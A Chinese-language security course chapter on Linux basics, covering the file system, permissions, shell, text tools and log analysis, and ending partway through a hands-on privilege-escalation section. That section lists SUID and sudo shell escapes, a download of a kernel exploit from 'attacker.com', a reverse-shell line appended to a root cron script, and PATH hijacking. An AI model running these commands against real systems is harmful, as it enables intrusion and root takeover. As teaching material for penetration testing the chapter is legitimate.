---
title: "第06章-操作系统基础-Linux"
type: docs
weight: 6
---

# 第06章 操作系统基础-Linux - 章节概览

## 为什么黑客必须精通Linux

Linux是网络安全领域最重要的操作系统，没有之一。Kali Linux、Parrot OS等渗透测试发行版基于Linux，全球超过70%的Web服务器运行Linux，Android手机的内核是Linux，云计算基础设施的底层是Linux，甚至物联网设备中也大量运行着精简的Linux系统。

对于安全研究者而言，Linux不仅仅是一个工具，更是一种思维方式。Linux的开放性让你能够深入理解操作系统的每一个层面——从内核调度到文件权限，从进程管理到网络栈实现。这种深度理解是发现和利用漏洞的基础。

## 本章学习目标

完成本章学习后，你应该能够：

1. **理解Linux系统架构**：掌握Linux内核、Shell、文件系统、进程管理等核心概念
2. **熟练使用命令行**：能够高效地使用Bash进行文件操作、文本处理、系统管理
3. **掌握权限管理**：理解Linux的用户/组权限模型、SUID/SGID、特殊权限位
4. **了解系统安全机制**：熟悉iptables防火墙、SELinux/AppArmor、日志系统等
5. **具备基础的Linux安全评估能力**：能够检查系统配置、识别安全隐患

## 章节内容结构

- **01-理论基础**：Linux历史与哲学、系统架构、文件系统层次标准、Shell与命令行、用户与权限模型、进程管理、包管理系统
- **02-核心技巧**：Bash高级用法、文本处理三剑客（grep/sed/awk）、网络命令、系统管理命令、Shell脚本编程
- **03-实战案例**：Linux提权实战、日志分析、后门检测、系统加固、容器逃逸基础
- **04-常见误区**：关于Linux安全的常见错误认知
- **05-练习方法**：Linux学习路径、命令行练习、安全实验设计
- **06-本章小结**：核心知识点回顾、进阶方向

## 学习建议

Linux的学习没有捷径，唯一的秘诀就是"多用"。建议你：

1. **将Kali Linux或Ubuntu作为主力系统使用**，而不是偶尔打开虚拟机练习
2. **尽量用命令行完成所有操作**，包括文件管理、网络配置、软件安装等
3. **每天至少使用终端30分钟**，形成肌肉记忆
4. **阅读man手册**，这是最权威的参考资料
5. **参与开源项目**，在实际项目中提升Linux技能

## 前置知识要求

- 了解操作系统的基本概念（进程、内存、文件系统）
- 完成第05章网络基础的学习
- 有一台可以安装Linux的电脑或虚拟机

## 预计学习时间

- 理论学习：10-12小时
- 实验练习：15-20小时
- 总计：25-32小时

Linux的世界博大精深，让我们开始探索。


***
# 第06章 操作系统基础-Linux - 理论基础

## 一、Linux历史与哲学

### 1.1 Linux的诞生

Linux的故事始于1991年，芬兰赫尔辛基大学的学生Linus Torvalds在MINIX操作系统的基础上开始编写一个新的操作系统内核。他在comp.os.minix新闻组上发布了那封著名的邮件："我在做一个（免费的）操作系统（只是个爱好，不会像GNU那样大而专业）..."

三十多年后的今天，Linux已经成为世界上最重要的操作系统之一。它运行在全球超过90%的公有云实例上，支撑着互联网的基础设施，驱动着数十亿Android设备，也是网络安全领域的标准平台。

### 1.2 开源哲学

Linux的成功离不开开源运动。Richard Stallman发起的GNU项目为Linux提供了大量的用户空间工具。GNU/Linux的结合创造了一个完整的、自由的操作系统。

开源的核心理念：
- **自由使用**：任何人都可以免费使用
- **自由研究**：可以查看源代码，理解系统的工作原理
- **自由修改**：可以根据需要修改代码
- **自由分发**：可以将修改后的版本分享给他人

对于安全研究者而言，开源意味着你可以深入研究操作系统的每一个细节，这是发现漏洞和理解攻击的基础。闭源系统中的"隐匿式安全"在开源世界中不适用——安全性来自于公开的审查和改进，而不是隐藏。

### 1.3 Linux发行版

Linux发行版 = Linux内核 + GNU工具 + 包管理系统 + 桌面环境 + 各种应用

**安全领域常用的发行版**：
- **Kali Linux**：最流行的渗透测试发行版，预装600+安全工具
- **Parrot Security OS**：轻量级安全发行版，适合低配置机器
- **BlackArch Linux**：基于Arch Linux的安全发行版，工具更全面
- **REMnux**：专注于恶意软件分析的发行版
- **Tails**：注重隐私的发行版，所有流量通过Tor

**服务器领域常用的发行版**：
- **Ubuntu Server**：最流行的服务器发行版
- **CentOS/Rocky Linux/AlmaLinux**：RHEL的社区版本
- **Debian**：稳定性著称，Ubuntu的上游

## 二、Linux系统架构

### 2.1 内核（Kernel）

Linux内核是操作系统的核心，负责管理硬件资源和提供系统服务。内核的主要子系统：

**进程管理**：
- 进程调度：CFS（完全公平调度器）决定哪个进程获得CPU时间
- 进程间通信：管道、信号、共享内存、消息队列、Socket
- 进程状态：运行、可中断等待、不可中断等待、停止、僵尸

**内存管理**：
- 虚拟内存：每个进程拥有独立的虚拟地址空间
- 分页机制：将虚拟地址映射到物理地址
- 内存保护：防止进程访问其他进程的内存
- OOM Killer：内存不足时杀死占用最多内存的进程

**文件系统**：
- VFS（虚拟文件系统）：提供统一的文件操作接口
- 支持多种文件系统：ext4、XFS、Btrfs、NTFS、FAT等

**设备驱动**：
- 字符设备：键盘、鼠标、串口
- 块设备：硬盘、U盘
- 网络设备：网卡

**网络栈**：
- 完整的TCP/IP协议栈实现
- Netfilter框架：防火墙和数据包过滤的基础

**安全模块**：
- SELinux：强制访问控制
- AppArmor：应用级访问控制
- Seccomp：限制进程可以使用的系统调用

### 2.2 系统调用（System Call）

系统调用是用户空间程序与内核交互的接口。常见的系统调用类别：

- **进程管理**：fork()、exec()、exit()、wait()、kill()
- **文件操作**：open()、read()、write()、close()、stat()
- **内存管理**：mmap()、brk()、mprotect()
- **网络通信**：socket()、bind()、listen()、accept()、connect()
- **信号处理**：signal()、sigaction()

从安全角度看，系统调用是攻击的重要目标。很多漏洞利用涉及系统调用的滥用，如缓冲区溢出覆盖返回地址跳转到execve()。seccomp可以限制进程可用的系统调用，减少攻击面。

### 2.3 用户空间

**GNU核心工具**：
- coreutils：ls、cp、mv、rm、cat、chmod等基本命令
- bash：最常用的Shell
- glibc：C标准库，提供系统调用的封装

**系统服务**：
- systemd（现代发行版）或SysVinit（旧版）：初始化系统和服务管理
- cron：定时任务
- syslog/journald：日志系统

## 三、文件系统层次标准（FHS）

### 3.1 目录结构

Linux采用单一的目录树结构，所有文件和目录都在根目录`/`下：

```text
/
├── bin/      → 基本用户命令（ls, cp, cat等）
├── sbin/     → 系统管理命令（iptables, fdisk等）
├── etc/      → 系统配置文件
├── home/     → 用户主目录
├── root/     → root用户的主目录
├── var/      → 可变数据（日志、缓存、临时文件）
├── tmp/      → 临时文件（重启后可能清除）
├── usr/      → 用户程序和数据
│   ├── bin/  → 用户命令
│   ├── sbin/ → 系统管理命令
│   ├── lib/  → 库文件
│   └── share/ → 共享数据
├── opt/      → 可选的第三方软件
├── dev/      → 设备文件
├── proc/     → 进程信息的虚拟文件系统
├── sys/      → 内核对象的虚拟文件系统
├── boot/     → 引导加载器和内核文件
├── lib/      → 基本共享库
├── mnt/      → 临时挂载点
└── media/    → 可移动设备挂载点
```

### 3.2 安全相关的重要目录

**`/etc/`** — 系统配置文件：
- `/etc/passwd`：用户账户信息
- `/etc/shadow`：用户密码哈希（仅root可读）
- `/etc/group`：组信息
- `/etc/sudoers`：sudo权限配置
- `/etc/ssh/sshd_config`：SSH服务器配置
- `/etc/crontab`：定时任务配置
- `/etc/fstab`：文件系统挂载配置
- `/etc/hosts`：本地DNS解析
- `/etc/resolv.conf`：DNS服务器配置

**`/var/log/`** — 系统日志：
- `/var/log/auth.log`（Debian系）或 `/var/log/secure`（RHEL系）：认证日志
- `/var/log/syslog` 或 `/var/log/messages`：系统日志
- `/var/log/kern.log`：内核日志
- `/var/log/apache2/` 或 `/var/log/httpd/`：Web服务器日志

**`/proc/`** — 进程信息：
- `/proc/[PID]/`：每个进程的详细信息
- `/proc/[PID]/cmdline`：进程启动命令
- `/proc/[PID]/environ`：环境变量
- `/proc/[PID]/maps`：内存映射
- `/proc/[PID]/fd/`：文件描述符
- `/proc/net/`：网络连接信息

**`/dev/`** — 设备文件：
- `/dev/sda`：硬盘设备
- `/dev/null`：丢弃所有写入
- `/dev/zero`：提供零字节
- `/dev/random` 和 `/dev/urandom`：随机数生成器

### 3.3 文件类型

Linux中一切皆文件。文件类型包括：

- **普通文件（-）**：文本文件、二进制程序、图片等
- **目录文件（d）**：包含其他文件和目录的容器
- **符号链接（l）**：指向其他文件的快捷方式
- **块设备文件（b）**：硬盘、U盘等块设备
- **字符设备文件（c）**：键盘、鼠标等字符设备
- **管道文件（p）**：进程间通信
- **套接字文件（s）**：网络通信

## 四、用户与权限模型

### 4.1 用户和组

Linux是多用户操作系统。每个用户有一个唯一的UID（用户标识号），每个组有一个唯一的GID（组标识号）。

**特殊用户**：
- **root（UID=0）**：超级管理员，拥有系统的所有权限
- **系统用户（UID 1-999）**：用于运行系统服务，通常不能登录
- **普通用户（UID 1000+）**：日常使用的用户账户

**重要文件**：
- `/etc/passwd`：用户信息（用户名:密码占位:UID:GID:注释:主目录:Shell）
- `/etc/shadow`：密码哈希（用户名:哈希:最后修改:最小间隔:最大间隔:警告:过期:保留）
- `/etc/group`：组信息（组名:密码:GID:成员列表）

### 4.2 文件权限

Linux使用传统的UNIX权限模型，每个文件有三组权限：所有者（owner）、所属组（group）、其他用户（others）。

每组权限包含三种操作：
- **r（read）**：读取文件内容或列出目录内容
- **w（write）**：修改文件内容或在目录中创建/删除文件
- **x（execute）**：执行文件或进入目录

权限表示示例：
```text
-rwxr-xr--  1  alice  developers  4096  Jun 15 10:30  script.sh
│├─┤├─┤├─┤
│ │   │  └── 其他用户：r--（只读）
│ │   └──── 所属组：r-x（读和执行）
│ └──────── 所有者：rwx（读、写、执行）
└────────── 文件类型：-（普通文件）
```

数字表示法：r=4, w=2, x=1
- `rwxr-xr--` = 754
- `rw-r--r--` = 644
- `rwx------` = 700

### 4.3 特殊权限位

**SUID（Set User ID）**：
- 设置在可执行文件上
- 执行时以文件所有者的权限运行，而非执行者的权限
- 典型例子：`/usr/bin/passwd`（需要root权限修改shadow文件）
- 表示：`-rwsr-xr-x`（所有者的x位变为s）
- 安全风险：SUID程序如果存在漏洞，可以被利用获取root权限

**SGID（Set Group ID）**：
- 设置在可执行文件上：执行时以文件所属组的权限运行
- 设置在目录上：在该目录下创建的文件继承目录的组
- 表示：`-rwxr-sr-x`（组的x位变为s）

**Sticky Bit**：
- 设置在目录上
- 效果：只有文件的所有者、目录的所有者或root才能删除目录中的文件
- 典型例子：`/tmp`目录
- 表示：`drwxrwxrwt`（其他用户的x位变为t）

### 4.4 ACL（访问控制列表）

传统权限模型只能设置三组权限（所有者、组、其他）。ACL提供了更细粒度的权限控制：

```bash
# 查看ACL
getfacl filename

# 设置ACL
setfacl -m u:bob:rw filename    # 给bob用户读写权限
setfacl -m g:devs:r filename    # 给devs组读权限
setfacl -m o::--- filename      # 其他用户无权限
setfacl -x u:bob filename       # 删除bob的ACL
```

## 五、Shell与命令行

### 5.1 Shell类型

Shell是用户与操作系统交互的命令解释器。常见的Shell：

- **Bash**（Bourne Again Shell）：最常用的Shell，是大多数Linux发行版的默认Shell
- **Zsh**：功能更强大的Shell，macOS的默认Shell，配合Oh My Zsh使用
- **Fish**：用户友好的Shell，自动补全和语法高亮
- **Sh**：最原始的Bourne Shell，脚本兼容性最好
- **Dash**：轻量级Shell，用于系统启动脚本

### 5.2 Bash基础

**命令格式**：
```bash
command [options] [arguments]
# 例如
ls -la /home
```

**通配符**：
- `*`：匹配任意字符（不含隐藏文件）
- `?`：匹配单个字符
- `[abc]`：匹配括号内的任一字符
- `[a-z]`：匹配范围内的字符
- `{a,b,c}`：匹配大括号中的任一项

**重定向**：
- `>`：输出重定向（覆盖）
- `>>`：输出重定向（追加）
- `<`：输入重定向
- `2>`：错误输出重定向
- `&>`：标准输出和错误输出都重定向
- `|`：管道，将前一个命令的输出作为后一个命令的输入

**环境变量**：
- `$PATH`：可执行文件搜索路径
- `$HOME`：用户主目录
- `$USER`：当前用户名
- `$SHELL`：当前Shell
- `$PWD`：当前工作目录

### 5.3 Shell脚本基础

Shell脚本是将多个命令组合在一起的文本文件：

```bash
#!/bin/bash
# 这是一个简单的Shell脚本

# 变量
name="World"
echo "Hello, $name!"

# 条件判断
if [ -f /etc/passwd ]; then
    echo "passwd文件存在"
fi

# 循环
for i in 1 2 3 4 5; do
    echo "数字: $i"
done

# 读取用户输入
read -p "请输入用户名: " username
echo "你输入的是: $username"
```

## 六、进程管理

### 6.1 进程概念

进程是程序的执行实例。每个进程有：
- **PID**（进程ID）：唯一标识
- **PPID**（父进程ID）：创建该进程的父进程
- **UID/GID**：运行该进程的用户和组
- **状态**：运行、睡眠、停止、僵尸等
- **优先级**：决定CPU调度的先后

### 6.2 进程状态

- **R（Running）**：正在运行或在运行队列中
- **S（Sleeping）**：可中断睡眠，等待事件
- **D（Disk Sleep）**：不可中断睡眠，通常等待I/O
- **T（Stopped）**：被信号停止
- **Z（Zombie）**：已终止但父进程未回收

### 6.3 信号机制

信号是进程间通信的一种方式，用于通知进程发生了某个事件：

| 信号 | 编号 | 含义 | 常见用途 |
|------|------|------|----------|
| SIGHUP | 1 | 挂起 | 重新加载配置 |
| SIGINT | 2 | 中断 | Ctrl+C |
| SIGKILL | 9 | 强制终止 | 强制杀死进程 |
| SIGTERM | 15 | 终止 | 正常终止进程 |
| SIGSTOP | 19 | 暂停 | Ctrl+Z |
| SIGCONT | 18 | 继续 | fg/bg命令 |

### 6.4 守护进程

守护进程（Daemon）是在后台运行的系统服务进程，通常以d结尾命名（如sshd、httpd、mysqld）。现代Linux使用systemd管理守护进程：

```bash
# 查看服务状态
systemctl status sshd

# 启动/停止/重启服务
systemctl start sshd
systemctl stop sshd
systemctl restart sshd

# 开机自启
systemctl enable sshd
systemctl disable sshd
```

## 七、包管理系统

### 7.1 Debian系（apt）

```bash
# 更新包列表
sudo apt update

# 升级所有包
sudo apt upgrade

# 安装软件
sudo apt install package_name

# 卸载软件
sudo apt remove package_name

# 搜索软件
apt search keyword

# 查看已安装的包
dpkg -l | grep keyword

# 安装本地deb包
sudo dpkg -i package.deb
```

### 7.2 RHEL系（yum/dnf）

```bash
# 安装软件
sudo yum install package_name    # CentOS 7
sudo dnf install package_name    # CentOS 8+/Fedora

# 升级所有包
sudo yum update

# 搜索软件
yum search keyword

# 查看已安装的包
rpm -qa | grep keyword
```

## 八、文件系统管理

### 8.1 磁盘与分区

```bash
# 查看磁盘分区
lsblk
fdisk -l    # 需要root

# 查看磁盘使用情况
df -h

# 查看目录大小
du -sh /var/log
```

### 8.2 挂载与卸载

```bash
# 挂载设备
sudo mount /dev/sdb1 /mnt/usb

# 卸载设备
sudo umount /mnt/usb

# 查看挂载信息
mount | grep sdb
cat /proc/mounts
```

### 8.3 文件查找

```bash
# find命令
find / -name "*.conf" -type f           # 按名称查找
find / -perm -4000 -type f              # 查找SUID文件
find / -user root -perm -o+w -type f    # 查找其他用户可写的root文件
find / -nouser -o -nogroup              # 查找无主文件
find /var/log -mtime -7                 # 最近7天修改的文件

# locate命令（基于数据库，更快）
sudo updatedb
locate filename
```

## 九、网络管理

### 9.1 网络配置

```bash
# 查看网络接口
ip addr show
ifconfig    # 已弃用但仍在使用

# 查看路由
ip route show

# 查看DNS
cat /etc/resolv.conf

# 查看网络连接
ss -tunlp    # 显示监听端口
ss -tunp     # 显示所有连接

# 防火墙规则
sudo iptables -L -n    # 查看规则
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT    # 允许SSH
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT    # 允许HTTP
```

### 9.2 SSH安全配置

SSH是Linux远程管理的核心协议。安全配置要点：

```bash
# /etc/ssh/sshd_config 推荐配置
Port 2222                    # 修改默认端口
PermitRootLogin no           # 禁止root登录
PasswordAuthentication no    # 禁用密码认证，只用密钥
MaxAuthTries 3               # 最大认证尝试次数
AllowUsers alice bob         # 只允许特定用户登录
```

## 本节小结

本节系统介绍了Linux操作系统的理论基础，包括系统架构、文件系统、用户权限、Shell、进程管理等核心概念。这些知识是后续学习Linux安全和渗透测试的基础。下一节我们将学习如何在实际操作中运用这些知识。


***
# 第06章 操作系统基础-Linux - 核心技巧

## 一、文本处理三剑客

### 1.1 grep — 文本搜索

grep是Linux中最常用的文本搜索工具，用于在文件或输出中查找匹配指定模式的行。

```bash
# 基本搜索
grep "error" /var/log/syslog

# 忽略大小写
grep -i "error" /var/log/syslog

# 显示行号
grep -n "error" /var/log/syslog

# 递归搜索目录
grep -r "password" /etc/

# 显示匹配行的前后文
grep -C 3 "error" /var/log/syslog    # 前后各3行
grep -B 2 "error" /var/log/syslog    # 前2行
grep -A 2 "error" /var/log/syslog    # 后2行

# 使用正则表达式
grep -E "error|warning" /var/log/syslog    # 匹配error或warning
grep -P "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" access.log    # 匹配IP地址

# 反向匹配（显示不匹配的行）
grep -v "debug" /var/log/syslog

# 统计匹配行数
grep -c "error" /var/log/syslog

# 只显示匹配的部分
grep -o "error" /var/log/syslog

# 安全相关用法
grep -r "TODO\|FIXME\|HACK" /var/www/    # 查找代码中的安全标记
grep "Failed password" /var/log/auth.log    # 查找登录失败记录
grep "Accepted" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn    # 统计成功登录的IP
```

### 1.2 sed — 流编辑器

sed用于对文本进行替换、删除、插入等操作。

```bash
# 基本替换
sed 's/old/new/' file           # 替换每行第一个匹配
sed 's/old/new/g' file          # 替换所有匹配
sed 's/old/new/gi' file         # 替换所有匹配（忽略大小写）

# 直接修改文件
sed -i 's/old/new/g' file       # 直接修改原文件
sed -i.bak 's/old/new/g' file   # 修改前备份

# 删除行
sed '/pattern/d' file           # 删除匹配的行
sed '1,5d' file                 # 删除第1-5行
sed '/^$/d' file                # 删除空行

# 插入和追加
sed '3i\新插入的行' file         # 在第3行前插入
sed '3a\新追加的行' file         # 在第3行后追加

# 提取特定行
sed -n '10p' file               # 显示第10行
sed -n '10,20p' file            # 显示第10-20行

# 安全相关用例
sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config    # 修改SSH配置
sed -n '/Failed/p' /var/log/auth.log    # 提取登录失败记录
echo "password123" | sed 's/./\*/g'    # 将密码替换为星号
```

### 1.3 awk — 文本处理语言

awk是一个强大的文本处理工具，适合处理结构化数据。

```bash
# 基本语法
awk 'pattern {action}' file

# 打印特定列
awk '{print $1}' file           # 打印第一列
awk '{print $1, $3}' file       # 打印第一和第三列
awk -F: '{print $1}' /etc/passwd    # 指定分隔符

# 条件过滤
awk '$3 > 1000' file            # 第三列大于1000的行
awk '/error/' file              # 包含error的行

# 内置变量
awk '{print NR, $0}' file       # NR=行号, $0=整行
awk '{print NF, $NF}' file      # NF=字段数, $NF=最后一个字段

# 数学运算
awk '{sum += $1} END {print sum}' file    # 求和

# 安全相关用例
# 统计访问日志中每个IP的请求数
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20

# 提取HTTP状态码统计
awk '{print $9}' access.log | sort | uniq -c | sort -rn

# 查找大于100MB的文件
ls -l | awk '$5 > 104857600 {print $9, $5}'

# 解析/etc/passwd
awk -F: '$3 == 0 {print "root用户:", $1}' /etc/passwd
awk -F: '$7 != "/sbin/nologin" {print $1, $7}' /etc/passwd
```

## 二、系统信息收集

### 2.1 基本系统信息

```bash
# 内核版本
uname -a
cat /proc/version

# 发行版信息
cat /etc/os-release
lsb_release -a

# 系统运行时间
uptime

# 主机名
hostname
cat /etc/hostname

# CPU信息
lscpu
cat /proc/cpuinfo

# 内存信息
free -h
cat /proc/meminfo

# 磁盘信息
lsblk
df -h
fdisk -l
```

### 2.2 用户信息收集

```bash
# 当前用户
whoami
id

# 所有用户
cat /etc/passwd

# 最近登录
last
lastlog

# 当前登录用户
who
w

# sudo权限
sudo -l

# 查找可登录的用户
grep -v "nologin\|false" /etc/passwd

# 查找UID为0的用户（应该只有root）
awk -F: '$3 == 0' /etc/passwd

# 查找空密码账户
sudo awk -F: '($2 == "" || $2 == "!") {print $1}' /etc/shadow
```

### 2.3 网络信息收集

```bash
# 网络接口
ip addr show
ifconfig

# 路由表
ip route show
route -n

# DNS配置
cat /etc/resolv.conf
cat /etc/hosts

# 网络连接
ss -tunlp          # 监听端口
ss -tunp           # 所有连接
netstat -tunlp     # 旧命令

# 防火墙规则
sudo iptables -L -n -v
sudo iptables -t nat -L -n -v

# ARP缓存
arp -a
ip neigh show
```

### 2.4 进程信息收集

```bash
# 所有进程
ps aux
ps -ef

# 进程树
pstree
ps auxf

# 按CPU使用率排序
ps aux --sort=-%cpu | head -20

# 按内存使用率排序
ps aux --sort=-%mem | head -20

# 查看特定进程的详细信息
ls -la /proc/[PID]/
cat /proc/[PID]/cmdline
cat /proc/[PID]/environ
ls -la /proc/[PID]/fd/
cat /proc/[PID]/maps

# 实时监控
top
htop    # 更好的界面
```

## 三、文件权限管理技巧

### 3.1 权限检查

```bash
# 查找SUID文件（可能被用于提权）
find / -perm -4000 -type f 2>/dev/null

# 查找SGID文件
find / -perm -2000 -type f 2>/dev/null

# 查找可写的文件和目录
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null

# 查找其他用户可写的文件
find / -perm -o+w -type f 2>/dev/null

# 查找最近修改的文件
find /etc -mtime -1 -type f    # 最近1天修改
find /tmp -mmin -30 -type f    # 最近30分钟修改

# 查找无主文件
find / -nouser -o -nogroup 2>/dev/null
```

### 3.2 权限修改

```bash
# 修改权限
chmod 755 file          # rwxr-xr-x
chmod u+x file          # 给所有者添加执行权限
chmod g-w file          # 移除组的写权限
chmod o= file           # 移除其他用户的所有权限
chmod +s file           # 设置SUID

# 修改所有者
chown alice:devs file   # 修改所有者和组
chown -R alice:devs /path/    # 递归修改

# 修改组
chgrp devs file

# 设置默认ACL
setfacl -d -m g:devs:rw /shared/    # 新文件自动继承
```

## 四、Shell脚本安全编程

### 4.1 实用安全脚本

**系统安全检查脚本**：
```bash
#!/bin/bash
# 系统安全检查脚本

echo "=== 系统安全检查报告 ==="
echo "日期: $(date)"
echo ""

echo "=== 1. SUID文件 ==="
find / -perm -4000 -type f 2>/dev/null

echo ""
echo "=== 2. 可写的关键文件 ==="
find /etc -writable -type f 2>/dev/null

echo ""
echo "=== 3. UID为0的用户 ==="
awk -F: '$3 == 0 {print $1}' /etc/passwd

echo ""
echo "=== 4. 空密码账户 ==="
sudo awk -F: '($2 == "" || $2 == "!") {print $1}' /etc/shadow 2>/dev/null

echo ""
echo "=== 5. 最近的登录失败 ==="
grep "Failed password" /var/log/auth.log 2>/dev/null | tail -10

echo ""
echo "=== 6. 开放的端口 ==="
ss -tunlp

echo ""
echo "=== 7. 定时任务 ==="
crontab -l 2>/dev/null
sudo crontab -l 2>/dev/null
ls -la /etc/cron.*

echo ""
echo "=== 8. 异常进程 ==="
ps aux | awk '$3 > 50 {print}'

echo ""
echo "=== 检查完成 ==="
```

**日志分析脚本**：
```bash
#!/bin/bash
# SSH暴力破解检测脚本

LOG_FILE="/var/log/auth.log"
THRESHOLD=10

echo "=== SSH暴力破解检测 ==="
echo "阈值: ${THRESHOLD}次失败"
echo ""

# 统计每个IP的失败次数
echo "失败次数最多的IP:"
grep "Failed password" "$LOG_FILE" | \
    awk '{print $(NF-3)}' | \
    sort | uniq -c | sort -rn | head -20 | \
    while read count ip; do
        if [ "$count" -ge "$THRESHOLD" ]; then
            echo "  [警告] $ip: ${count}次失败"
        else
            echo "  $ip: ${count}次失败"
        fi
    done

echo ""
echo "尝试的用户名:"
grep "Failed password" "$LOG_FILE" | \
    grep -oP 'for (?:invalid user )?\K\S+' | \
    sort | uniq -c | sort -rn | head -10
```

### 4.2 Shell脚本安全编写准则

1. **始终引用变量**：`"$variable"` 而不是 `$variable`
2. **检查命令返回值**：`command || { echo "失败"; exit 1; }`
3. **使用`set -euo pipefail`**：遇到错误立即退出
4. **避免使用eval**：容易导致命令注入
5. **使用临时文件时注意安全**：`mktemp` 创建临时文件
6. **不要在脚本中硬编码密码**

## 五、日志分析技巧

### 5.1 重要日志文件

```bash
# 认证日志
tail -f /var/log/auth.log           # Debian系实时监控
tail -f /var/log/secure             # RHEL系

# 系统日志
tail -f /var/log/syslog
journalctl -f                       # systemd日志

# Web服务器日志
tail -f /var/log/apache2/access.log
tail -f /var/log/nginx/access.log

# 定时任务日志
grep CRON /var/log/syslog
```

### 5.2 常用日志分析命令

```bash
# 统计SSH登录失败的IP
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn

# 统计HTTP 404请求
awk '$9 == 404 {print $7}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20

# 查找可疑的Web请求（SQL注入、XSS等）
grep -iE "(union.*select|<script|alert\(|../|/etc/passwd)" /var/log/apache2/access.log

# 查找异常的cron执行
grep "CRON" /var/log/syslog | grep -v "CMD" | tail -20

# 查找权限变更
grep -i "chmod\|chown" /var/log/auth.log
```

## 六、网络调试技巧

### 6.1 网络连通性测试

```bash
# 基本ping
ping -c 4 8.8.8.8

# traceroute
traceroute 8.8.8.8
mtr 8.8.8.8             # 更好的实时路由追踪

# 端口测试
nc -zv 192.168.1.1 80       # TCP连接测试
nc -zuv 192.168.1.1 53      # UDP测试
nc -zv 192.168.1.1 1-100    # 端口范围扫描

# DNS测试
dig example.com
nslookup example.com

# HTTP测试
curl -I http://example.com
curl -v http://example.com 2>&1 | grep -i "ssl\|tls\|certificate"
```

### 6.2 网络流量监控

```bash
# 实时流量监控
iftop -i eth0
nethogs eth0

# 流量统计
vnstat -i eth0
vnstat -i eth0 -d    # 按天统计

# 连接监控
watch -n 1 "ss -tunp | grep ESTABLISHED"
```

## 七、实用别名和函数

### 7.1 推荐的Bash别名

在`~/.bashrc`中添加：

```bash
# 安全相关别名
alias ll='ls -alh'
alias ports='ss -tunlp'
alias myip='curl -s ifconfig.me'
alias logs='tail -f /var/log/syslog'
alias failed='grep "Failed password" /var/log/auth.log | tail -20'
alias suid='find / -perm -4000 -type f 2>/dev/null'
alias hist='history | awk "{print \$2}" | sort | uniq -c | sort -rn | head -20'

# 安全函数
# 快速查找包含指定字符串的文件
fstr() { grep -rn "$1" ${2:-.}; }

# 快速查看端口
port() { ss -tlnp | grep ":$1"; }

# 快速解码base64
b64d() { echo "$1" | base64 -d; }

# 快速生成密码
genpass() { openssl rand -base64 ${1:-16}; }
```

## 本节小结

本节介绍了Linux系统管理的核心技巧，重点是文本处理（grep/sed/awk）、系统信息收集、权限管理、Shell脚本编程和日志分析。这些技能在渗透测试和安全运维中都会频繁使用。建议通过实际操作来熟练掌握这些命令。


***
# 第06章 操作系统基础-Linux - 实战案例

## 案例一：Linux本地提权实战

### 1.1 背景说明

本地提权是渗透测试中的关键步骤。当你通过某个漏洞获得了低权限的Shell后，需要提升到root权限才能完全控制系统。Linux提权的方法主要包括：内核漏洞、SUID滥用、sudo配置不当、定时任务劫持、PATH劫持等。

### 1.2 信息收集

获得一个低权限Shell后，首先进行全面的信息收集：

```bash
# 基本信息
id
uname -a
cat /etc/os-release
hostname

# 用户信息
cat /etc/passwd
cat /etc/shadow 2>/dev/null    # 尝试读取
sudo -l                         # 查看sudo权限

# SUID文件
find / -perm -4000 -type f 2>/dev/null

# 可写的文件和目录
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null

# 定时任务
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
ls -la /var/spool/cron/

# 网络信息
ss -tunlp
ip addr show

# 进程信息
ps aux

# 内核版本
uname -r
cat /proc/version
```

### 1.3 方法一：SUID程序利用

**发现SUID程序**：
```bash
find / -perm -4000 -type f 2>/dev/null
```

**检查GTFOBins**：如果发现不常见的SUID程序，查询 https://gtfobins.github.io/ 是否可以利用。

**常见可利用的SUID程序**：

```bash
# find命令提权（如果find设置了SUID）
find . -exec /bin/sh -p \; -quit
# 或者
find /tmp -name test -exec /bin/sh -p \;

# python提权
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# bash提权（如果bash设置了SUID）
/bin/bash -p

# nmap提权（旧版本）
nmap --interactive
!sh

# vim提权
vim -c ':!sh'

# less/more提权
less /etc/passwd
# 在less中输入 !sh
```

### 1.4 方法二：Sudo配置不当

```bash
# 查看sudo权限
sudo -l

# 如果用户可以以root身份运行某些程序
# 例如：(root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!sh'

# 例如：(root) NOPASSWD: /usr/bin/find
sudo find /tmp -name test -exec /bin/sh \;

# 例如：(root) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import pty;pty.spawn("/bin/bash")'

# 例如：(root) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/bash")}'

# 例如：(root) NOPASSWD: /usr/bin/env
sudo env /bin/bash

# 例如：(root) NOPASSWD: /usr/bin/perl
sudo perl -e 'exec "/bin/bash";'
```

### 1.5 方法三：内核漏洞利用

```bash
# 查找内核版本
uname -r

# 使用searchsploit搜索漏洞
searchsploit linux kernel 3.13

# 常见的内核提权漏洞
# DirtyCow (CVE-2016-5195) - Linux内核 < 4.8.3
# DirtyPipe (CVE-2022-0847) - Linux 5.8+
# PwnKit (CVE-2021-4034) - pkexec

# 下载并编译exploit
wget http://attacker.com/exploit.c
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```

### 1.6 方法四：定时任务劫持

```bash
# 查看定时任务
cat /etc/crontab
ls -la /etc/cron.*
ls -la /var/spool/cron/crontabs/

# 如果发现某个脚本以root身份定期执行且当前用户可写
# 例如：*/5 * * * * root /opt/scripts/backup.sh
ls -la /opt/scripts/backup.sh

# 如果该文件可写，在其中添加反弹Shell
echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> /opt/scripts/backup.sh

# 在攻击机上监听
nc -lvnp 4444
```

### 1.7 方法五：PATH环境变量劫持

```bash
# 如果SUID程序调用命令时没有使用绝对路径
# 例如一个SUID脚本调用了 "service" 命令

# 创建一个恶意的service脚本
echo '#!/bin/bash' > /tmp/service
echo '/bin/bash -p' >> /tmp/service
chmod +x /tmp/service

# 修改PATH使/tmp在最前面
export PATH=/tmp:$PATH

